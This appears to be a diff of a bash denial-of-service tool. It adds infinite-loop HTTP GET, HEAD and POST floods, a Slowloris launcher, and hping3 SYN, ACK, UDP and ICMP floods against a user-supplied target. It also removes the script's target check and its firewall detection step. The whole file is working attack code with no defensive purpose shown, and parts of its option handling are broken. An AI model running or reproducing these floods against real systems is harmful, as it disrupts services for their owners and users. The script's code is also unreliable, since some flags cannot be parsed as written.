@@ -48,146 +48,137 @@ show_help() {
     echo -e "  -n    Set the number of requests to send (default: 1000)"
     echo -e "  -H    Send custom HTTP headers"
     echo -e "  -v    Enable verbose output"
-    echo -e "  -pSize  Specify packet size for attacks (default: 56)"
-    echo -e "  -sFlag  Specify TCP flag (SYN, ACK, etc.)"
+    echo -e "  -pSize Specify packet size for attacks (default: 56)"
+    echo -e "  -sFlag Specify TCP flag (SYN, ACK, etc.)"
     echo -e "  -seq   Specify sequence number for TCP packets"
     echo -e "  -win   Specify window size for TCP packets"
     echo -e "  -proto Specify protocol for attack (TCP, UDP, ICMP, RAW-IP)"
-    echo -e "  -P    Specify packet delay (in ms)"
+    echo -e "  -P     Specify packet delay (in ms)"
+    echo -e "  -l     Perform Slowloris attack with automatic installation detection"
+    echo -e "  -t     Target specific attack type (GET, POST, HEAD, SYN, etc.)"
 }
 
-# Function to send HTTP request with custom headers
-send_http_request() {
-    target=$1
-    custom_headers=$2
-    echo -e "${CYAN}[*] Sending HTTP request to $target${RESET}"
-    
-    if [ -n "$custom_headers" ]; then
-        echo -e "${CYAN}[*] Using custom headers:${RESET} $custom_headers"
-        curl -s -X GET $target -H "$custom_headers"
-    else
-        curl -s -X GET $target
-    fi
-}
-
-# Function to scan open ports on target
+# Scan for open ports and handle attacks
 scan_ports() {
     target=$1
     echo -e "${CYAN}[*] Scanning for open ports on $target${RESET}"
-    
     open_ports=$(nmap -p- --min-rate=5000 -T4 $target | grep 'open' | awk -F '/' '{print $1}')
-    
     if [ -z "$open_ports" ]; then
         echo -e "${RED}[!] No open ports found.${RESET}"
         return 1
     else
         echo -e "${GREEN}[+] Open ports: $open_ports${RESET}"
-        port=$(echo "$open_ports" | head -n 1)  # Assign the first open port
+        port=$(echo "$open_ports" | head -n 1)
     fi
 }
 
-# Anti-DDoS/Firewall Detection and Bypass with Nmap
-anti_ddos_detection() {
+# Non-root attacks
+http_get_flood() {
     target=$1
-    echo -e "${CYAN}[*] Checking for firewall or anti-DDoS protections on $target${RESET}"
-    
-    # Scan the first 1000 ports for a basic check
-    firewall_check=$(nmap -p 1-1000 $target | grep 'filtered')
-    if [ -n "$firewall_check" ]; then
-        echo -e "${RED}[!] Potential firewall detected on $target, some ports are filtered.${RESET}"
-        
-        # Bypass Firewall (Attempting a more stealthy scan)
-        echo -e "${CYAN}[*] Attempting to bypass firewall with stealth SYN scan...${RESET}"
-        nmap -sS -p 1-1000 --min-rate=5000 -T4 $target
-    else
-        echo -e "${GREEN}[+] No firewall detected on $target, ports are open.${RESET}"
-    fi
-
-    # Check response time for rate-limiting (simple check)
-    echo -e "${CYAN}[*] Checking response time on $target...${RESET}"
-    response_time=$(curl -s -o /dev/null -w "%{time_total}" $target)
-    echo -e "${CYAN}[*] Response time: ${response_time}s${RESET}"
-    if (( $(echo "$response_time > 1.0" | bc -l) )); then
-        echo -e "${RED}[!] High response time detected on $target, possibly due to rate limiting or anti-DDoS protection.${RESET}"
-    else
-        echo -e "${GREEN}[+] Response time is normal on $target.${RESET}"
-    fi
-}
-
-# Delay Testing Function
-test_packet_delay() {
-    target=$1
-    packet_delay=$2
-    if [ -n "$packet_delay" ]; then
-        echo -e "${CYAN}[*] Testing packet delay on $target with a delay of ${packet_delay}ms${RESET}"
-        curl -s -o /dev/null -w "%{time_total}" --max-time $packet_delay $target
-        echo -e "${CYAN}[+] Testing complete. Packet delay is set to ${packet_delay}ms.${RESET}"
-    fi
-}
-
-# ICMP flood attack
-icmp_flood() {
-    target=$1
-    echo -e "${CYAN}[*] Attacking with ICMP flood on $target${RESET}"
+    echo -e "${CYAN}[*] Starting HTTP GET flood on $target${RESET}"
     while true; do
-        echo -e "${CYAN}[+] Attacking with ICMP flood...${RESET}"
-        sudo ping -f $target &>/dev/null &
-        echo -e "${CYAN}[+] Attacking IP: $target with ICMP flood...${RESET}"
-        sleep 1
+        curl -s -X GET $target &>/dev/null &
     done
 }
 
-# TCP SYN flood attack
+slowloris_attack() {
+    target=$1
+    packets=10000  # Specify 10k packets for the Slowloris attack
+    echo -e "${CYAN}[*] Starting Slowloris attack with $packets packets on $target${RESET}"
+
+    # Check if pip3 and slowloris are installed
+    if command -v pip3 &> /dev/null && pip3 show slowloris &> /dev/null; then
+        echo -e "${CYAN}[*] Using Slowloris installed via pip3${RESET}"
+        
+        # Get path to slowloris script and ensure it's executable
+        slowloris_installed=$(pip3 show slowloris | grep Location | awk '{print $2}')"/slowloris.py"
+        
+        # Ensure the script exists and is executable
+        if [ -f "$slowloris_installed" ]; then
+            echo -e "${CYAN}[*] Running Slowloris attack...${RESET}"
+            # Fixed: Passing arguments correctly to Slowloris
+            python3 $slowloris_installed -p 80 -s $packets $target
+        else
+            echo -e "${RED}[!] Slowloris not found in pip3 installation directory.${RESET}"
+        fi
+
+    # If Slowloris is cloned via GitHub, use it from the home directory
+    elif [ -d "$HOME/slowloris" ]; then
+        echo -e "${CYAN}[*] Using Slowloris from git clone directory${RESET}"
+        cd "$HOME/slowloris"
+        # Fixed: Corrected Slowloris arguments
+        python3 slowloris.py -p 80 -s $packets $target
+    else
+        echo -e "${RED}[!] Slowloris not installed. Please install using 'pip3 install slowloris' or 'git clone https://github.com/gkbrk/slowloris.git'${RESET}"
+    fi
+}
+
+http_head_flood() {
+    target=$1
+    echo -e "${CYAN}[*] Starting HTTP HEAD flood on $target${RESET}"
+    while true; do
+        curl -s -X HEAD $target &>/dev/null &
+    done
+}
+
+# Root-required attacks
+tcp_ack_flood() {
+    target=$1
+    port=$2
+    echo -e "${CYAN}[*] Starting TCP ACK flood on $target:$port (requires root)${RESET}"
+    while true; do
+        sudo hping3 --ack -p $port --flood $target &>/dev/null &
+    done
+}
+
+http_post_flood() {
+    target=$1
+    echo -e "${CYAN}[*] Starting HTTP POST flood on $target${RESET}"
+    while true; do
+        curl -s -X POST $target --data "data=payload" &>/dev/null &
+    done
+}
+
+# New Root-required attacks
 syn_flood() {
     target=$1
     port=$2
-    echo -e "${CYAN}[*] Attacking with TCP SYN flood on $target:$port${RESET}"
+    echo -e "${CYAN}[*] Starting TCP SYN flood on $target:$port (requires root)${RESET}"
     while true; do
-        echo -e "${CYAN}[+] Attacking with TCP SYN flood...${RESET}"
         sudo hping3 --syn -p $port --flood $target &>/dev/null &
-        echo -e "${CYAN}[+] Attacking IP: $target with TCP SYN flood...${RESET}"
-        sleep 1
     done
 }
 
-# TCP ACK flood attack
-ack_flood() {
-    target=$1
-    port=$2
-    echo -e "${CYAN}[*] Attacking with TCP ACK flood on $target:$port${RESET}"
-    while true; do
-        echo -e "${CYAN}[+] Attacking with TCP ACK flood...${RESET}"
-        sudo hping3 --ack -p $port --flood $target &>/dev/null &
-        echo -e "${CYAN}[+] Attacking IP: $target with TCP ACK flood...${RESET}"
-        sleep 1
-    done
-}
-
-# UDP flood attack
 udp_flood() {
     target=$1
     port=$2
-    echo -e "${CYAN}[*] Attacking with UDP flood on $target:$port${RESET}"
+    echo -e "${CYAN}[*] Starting UDP flood on $target:$port (requires root)${RESET}"
     while true; do
-        echo -e "${CYAN}[+] Attacking with UDP flood...${RESET}"
         sudo hping3 --udp -p $port --flood $target &>/dev/null &
-        echo -e "${CYAN}[+] Attacking IP: $target with UDP flood...${RESET}"
-        sleep 1
+    done
+}
+
+# ICMP Flood (requires root)
+icmp_flood() {
+    target=$1
+    echo -e "${CYAN}[*] Starting ICMP ping flood on $target (requires root)${RESET}"
+    while true; do
+        sudo hping3 --icmp --flood -p 80 $target &>/dev/null &
     done
 }
 
 # --- Main Execution Loop ---
-while getopts "u:p:hsrivf:n:H:A:U:W:T:t:Q:P:" opt; do
+while getopts "u:p:hsrivf:n:H:A:U:W:T:t:Q:P:l" opt; do
     case $opt in
         u) target=$OPTARG ;;
         p) port=$OPTARG ;;
-        h) show_help; exit 0 ;;
+        h) display_logo; show_help; exit 0 ;;
         s) scan_ports $target ;;
         r) retry_attack=true ;;
-        i) icmp_flood $target ;;
-        S) syn_flood $target $port ;;
-        A) ack_flood $target $port ;;
-        U) udp_flood $target $port ;;
+        i) attack_type="icmp_flood" ;;
+        S) attack_type="syn_flood" ;;
+        A) attack_type="tcp_ack_flood" ;;
+        U) attack_type="udp_flood" ;;
         f) spoofed_ip=$OPTARG ;;
         n) request_count=$OPTARG ;;
         H) custom_headers=$OPTARG ;;
@@ -198,6 +189,8 @@ while getopts "u:p:hsrivf:n:H:A:U:W:T:t:Q:P:" opt; do
         win) window_size=$OPTARG ;;
         proto) protocol=$OPTARG ;;
         P) packet_delay=$OPTARG ;;
+        l) attack_type="slowloris_attack" ;;
+        t) attack_type=$OPTARG ;;
         \?) show_help; exit 1 ;;
     esac
 done
@@ -215,16 +208,6 @@ if [ "$verbose" = true ]; then
     echo -e "  Packet Delay: ${packet_delay:-None}"
 fi
 
-# Ensure target is provided, otherwise show help
-if [ -z "$target" ]; then
-    echo -e "${RED}[ERROR] Target (-u) is required.${RESET}"
-    show_help
-    exit 1
-fi
-
-# Anti-DDoS/firewall detection
-anti_ddos_detection $target
-
 # Execute retry logic if needed
 if [ "$retry_attack" = true ]; then
     if [ -z "$port" ]; then
@@ -234,23 +217,14 @@ if [ "$retry_attack" = true ]; then
     echo -e "${GREEN}[+] Retrying attack with found port: $port${RESET}"
 fi
 
-# Test packet delay if specified
-test_packet_delay $target $packet_delay
-
-# Send HTTP request if needed
-if [ -n "$custom_headers" ]; then
-    send_http_request $target "$custom_headers"
-fi
-
-# Attack loop with real attack logic
+# Attack logic based on attack type
 while true; do
-    if [ "$icmp_flood" ]; then
-        icmp_flood $target
-    elif [ "$syn_flood" ]; then
-        syn_flood $target $port
-    elif [ "$ack_flood" ]; then
-        ack_flood $target $port
-    elif [ "$udp_flood" ]; then
-        udp_flood $target $port
-    fi
+    case $attack_type in
+        "http_get_flood") http_get_flood $target ;;
+        "slowloris_attack") slowloris_attack $target ;;
+        "syn_flood") syn_flood $target $port ;;
+        "udp_flood") udp_flood $target $port ;;
+        "icmp_flood") icmp_flood $target ;;
+        *) echo -e "${RED}[!] Unknown attack type: $attack_type${RESET}" ;;
+    esac
 done
